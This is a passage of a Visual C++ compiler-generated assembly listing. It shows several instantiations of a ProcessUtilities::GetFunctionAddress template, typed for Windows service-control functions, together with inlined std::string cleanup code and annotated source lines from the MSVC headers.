; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rdi+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN22@GetFunctio

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rdi]

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN36@GetFunctio

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN33@GetFunctio

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN36@GetFunctio:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN22@GetFunctio:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rdi+16], 0

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rdi+24], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rdi], 0
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 69   : 		return reinterpret_cast< fpType >( _GetFuncAddress(lib, proc) );

	mov	rax, rbx

; 70   : 	}

	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	mov	rbx, QWORD PTR [rsp+128]
	add	rsp, 96					; 00000060H
	pop	rdi
	ret	0
$LN33@GetFunctio:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN43@GetFunctio:
??$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEAU1@PEBDK@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEAU1@PEBDK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ENDP ; ProcessUtilities::GetFunctionAddress<SC_HANDLE__ * (__cdecl*)(SC_HANDLE__ *,char const *,unsigned long)>
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 40
proc$GSCopy$ = 72
__$ArrayPad$ = 80
lib$ = 112
proc$ = 120
?dtor$0@?0???$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEAU1@PEBDK@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEAU1@PEBDK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::GetFunctionAddress<SC_HANDLE__ * (__cdecl*)(SC_HANDLE__ *,char const *,unsigned long)>'::`1'::dtor$0
	mov	rcx, QWORD PTR proc$GSCopy$[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$0@?0???$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEAU1@PEBDK@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEAU1@PEBDK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::GetFunctionAddress<SC_HANDLE__ * (__cdecl*)(SC_HANDLE__ *,char const *,unsigned long)>'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
;	COMDAT ??$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEB_W0K@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEB_W0K@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
_TEXT	SEGMENT
$T1 = 40
proc$GSCopy$ = 72
__$ArrayPad$ = 80
lib$ = 112
proc$ = 120
??$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEB_W0K@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEB_W0K@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z PROC ; ProcessUtilities::GetFunctionAddress<SC_HANDLE__ * (__cdecl*)(wchar_t const *,wchar_t const *,unsigned long)>, COMDAT

; 68   : 	fpType GetFunctionAddress(HMODULE lib, std::string proc) {

$LN46:
	mov	QWORD PTR [rsp+24], rbx
	push	rdi
	sub	rsp, 96					; 00000060H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax
	mov	rdi, rdx
	mov	rbx, rcx
	mov	QWORD PTR proc$GSCopy$[rsp], rdx

; 69   : 		return reinterpret_cast< fpType >( _GetFuncAddress(lib, proc) );

	lea	rcx, QWORD PTR $T1[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rdx, rax
	mov	rcx, rbx
	call	?_GetFuncAddress@ProcessUtilities@@YAP6A_JXZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::_GetFuncAddress
	mov	rbx, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rdi+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN22@GetFunctio

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rdi]

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN36@GetFunctio

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN33@GetFunctio

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN36@GetFunctio:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN22@GetFunctio:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rdi+16], 0

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rdi+24], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rdi], 0
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 69   : 		return reinterpret_cast< fpType >( _GetFuncAddress(lib, proc) );

	mov	rax, rbx

; 70   : 	}

	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	mov	rbx, QWORD PTR [rsp+128]
	add	rsp, 96					; 00000060H
	pop	rdi
	ret	0
$LN33@GetFunctio:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN43@GetFunctio:
??$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEB_W0K@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEB_W0K@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ENDP ; ProcessUtilities::GetFunctionAddress<SC_HANDLE__ * (__cdecl*)(wchar_t const *,wchar_t const *,unsigned long)>
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 40
proc$GSCopy$ = 72
__$ArrayPad$ = 80
lib$ = 112
proc$ = 120
?dtor$0@?0???$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEB_W0K@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEB_W0K@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::GetFunctionAddress<SC_HANDLE__ * (__cdecl*)(wchar_t const *,wchar_t const *,unsigned long)>'::`1'::dtor$0
	mov	rcx, QWORD PTR proc$GSCopy$[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$0@?0???$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEB_W0K@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEB_W0K@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::GetFunctionAddress<SC_HANDLE__ * (__cdecl*)(wchar_t const *,wchar_t const *,unsigned long)>'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
;	COMDAT ??$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
_TEXT	SEGMENT
$T1 = 40
proc$GSCopy$ = 72
__$ArrayPad$ = 80
lib$ = 112
proc$ = 120
??$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z PROC ; ProcessUtilities::GetFunctionAddress<int (__cdecl*)(SC_HANDLE__ *,enum _SC_STATUS_TYPE,unsigned char *,unsigned long,unsigned long *)>, COMDAT

; 68   : 	fpType GetFunctionAddress(HMODULE lib, std::string proc) {

$LN46:
	mov	QWORD PTR [rsp+24], rbx
	push	rdi
	sub	rsp, 96					; 00000060H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax
	mov	rdi, rdx
	mov	rbx, rcx
	mov	QWORD PTR proc$GSCopy$[rsp], rdx

; 69   : 		return reinterpret_cast< fpType >( _GetFuncAddress(lib, proc) );

	lea	rcx, QWORD PTR $T1[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rdx, rax
	mov	rcx, rbx
	call	?_GetFuncAddress@ProcessUtilities@@YAP6A_JXZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::_GetFuncAddress
	mov	rbx, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rdi+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN22@GetFunctio

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rdi]

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN36@GetFunctio

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN33@GetFunctio

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN36@GetFunctio:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN22@GetFunctio:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rdi+16], 0

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rdi+24], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rdi], 0
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 69   : 		return reinterpret_cast< fpType >( _GetFuncAddress(lib, proc) );

	mov	rax, rbx

; 70   : 	}

	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	mov	rbx, QWORD PTR [rsp+128]
	add	rsp, 96					; 00000060H
	pop	rdi
	ret	0
$LN33@GetFunctio:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN43@GetFunctio:
??$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ENDP ; ProcessUtilities::GetFunctionAddress<int (__cdecl*)(SC_HANDLE__ *,enum _SC_STATUS_TYPE,unsigned char *,unsigned long,unsigned long *)>
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 40
proc$GSCopy$ = 72
__$ArrayPad$ = 80
lib$ = 112
proc$ = 120
?dtor$0@?0???$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::GetFunctionAddress<int (__cdecl*)(SC_HANDLE__ *,enum _SC_STATUS_TYPE,unsigned char *,unsigned long,unsigned long *)>'::`1'::dtor$0
	mov	rcx, QWORD PTR proc$GSCopy$[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$0@?0???$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::GetFunctionAddress<int (__cdecl*)(SC_HANDLE__ *,enum _SC_STATUS_TYPE,unsigned char *,unsigned long,unsigned long *)>'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
;	COMDAT ??$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@KPEB_W@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@KPEB_W@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
_TEXT	SEGMENT
$T1 = 40
proc$GSCopy$ = 72
__$ArrayPad$ = 80
lib$ = 112
proc$ = 120
??$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@KPEB_W@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@KPEB_W@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z PROC ; ProcessUtilities::GetFunctionAddress<int (__cdecl*)(SC_HANDLE__ *,unsigned long,wchar_t const *)>, COMDAT

; 68   : 	fpType GetFunctionAddress(HMODULE lib, std::string proc) {

$LN46:
	mov	QWORD PTR [rsp+24], rbx
	push	rdi
	sub	rsp, 96					; 00000060H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax
	mov	rdi, rdx
	mov	rbx, rcx
	mov	QWORD PTR proc$GSCopy$[rsp], rdx

; 69   : 		return reinterpret_cast< fpType >( _GetFuncAddress(lib, proc) );

	lea	rcx, QWORD PTR $T1[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rdx, rax
	mov	rcx, rbx
	call	?_GetFuncAddress@ProcessUtilities@@YAP6A_JXZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::_GetFuncAddress
	mov	rbx, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rdi+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN22@GetFunctio

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rdi]

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN36@GetFunctio

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN33@GetFunctio

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN36@GetFunctio:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN22@GetFunctio:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rdi+16], 0

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rdi+24], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rdi], 0
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 69   : 		return reinterpret_cast< fpType >( _GetFuncAddress(lib, proc) );

	mov	rax, rbx

; 70   : 	}

	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	mov	rbx, QWORD PTR [rsp+128]
	add	rsp, 96					; 00000060H
	pop	rdi
	ret	0
$LN33@GetFunctio:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN43@GetFunctio:
??$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@KPEB_W@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@KPEB_W@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ENDP ; ProcessUtilities::GetFunctionAddress<int (__cdecl*)(SC_HANDLE__ *,unsigned long,wchar_t const *)>
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 40
proc$GSCopy$ = 72
__$ArrayPad$ = 80
lib$ = 112
proc$ = 120
?dtor$0@?0???$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@KPEB_W@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@KPEB_W@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::GetFunctionAddress<int (__cdecl*)(SC_HANDLE__ *,unsigned long,wchar_t const *)>'::`1'::dtor$0
	mov	rcx, QWORD PTR proc$GSCopy$[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$0@?0???$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@KPEB_W@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@KPEB_W@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::GetFunctionAddress<int (__cdecl*)(SC_HANDLE__ *,unsigned long,wchar_t const *)>'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
